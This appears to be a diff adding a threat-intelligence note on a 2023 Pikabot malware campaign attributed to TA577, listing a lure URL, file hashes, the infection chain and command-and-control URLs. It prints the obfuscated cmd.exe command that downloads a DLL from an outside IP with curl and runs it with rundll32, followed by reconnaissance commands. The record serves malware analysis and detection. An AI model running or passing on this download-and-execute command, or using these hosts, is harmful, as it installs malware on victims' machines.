@@ -1,0 +1,45 @@
+03.10.2023 | Pikabot | TA577
+
+*************************************************
+
+.url https://normacsales.com/eal/
+.zip 02e2f8dd9d940865098ca5baf4705d542572180177a67c33ad658133f63fb0f8 pw = 678
+.dll aebff5134e07a1586b911271a49702c8623b8ac8da2c135d4d3b0145a826f507
+
+*************************************************
+
+zip > lnk > curl > dll
+
+cmd /c C:\Users\Admin\AppData\Local\Temp\TZZ.pdf.lnk
+
+cmd.exe /c UL || EChO UL & piNG UL || CURL http://207.246.78.68/6kQh/T7t -o C:\Users\Admin\AppData\Local\Temp\UL.log & piNG -n 3 UL || RUNDlL32 C:\Users\Admin\AppData\Local\Temp\UL.log , HUF_inc_var & EXiT 'qsCViPhzqU
+
+piNG UL 
+
+piNG -n 3 UL
+
+rundll32.exe C:\Users\Admin\AppData\Local\Temp\UL.dll, HUF_inc_var 
+
+SearchProtocolHost.exe
+
+whoami.exe /all
+
+ipconfig.exe /all
+
+netstat.exe -aon
+
+*************************************************
+
+distro urls
+
+http://207.246.78.68/6kQh/T7t
+
+
+*************************************************
+
+c2'
+
+https://167.86.96.3:2222/NeuraxisSharan/Svj2pdMRLUtTvVD?authoritarianismDivertibility=GD16XPBubwQiWrG&Rumenocentesis=hedgetaperMesoreodon
+https://79.141.175.96:2078/NeuraxisSharan/Svj2pdMRLUtTvVD?authoritarianismDivertibility=GD16XPBubwQiWrG&Rumenocentesis=hedgetaperMesoreodon
+https://38.242.240.28:1194/NeuraxisSharan/Svj2pdMRLUtTvVD?authoritarianismDivertibility=GD16XPBubwQiWrG&Rumenocentesis=hedgetaperMesoreodon
+https://209.126.9.47:2078/NeuraxisSharan/Svj2pdMRLUtTvVD?authoritarianismDivertibility=GD16XPBubwQiWrG&Rumenocentesis=hedgetaperMesoreodon
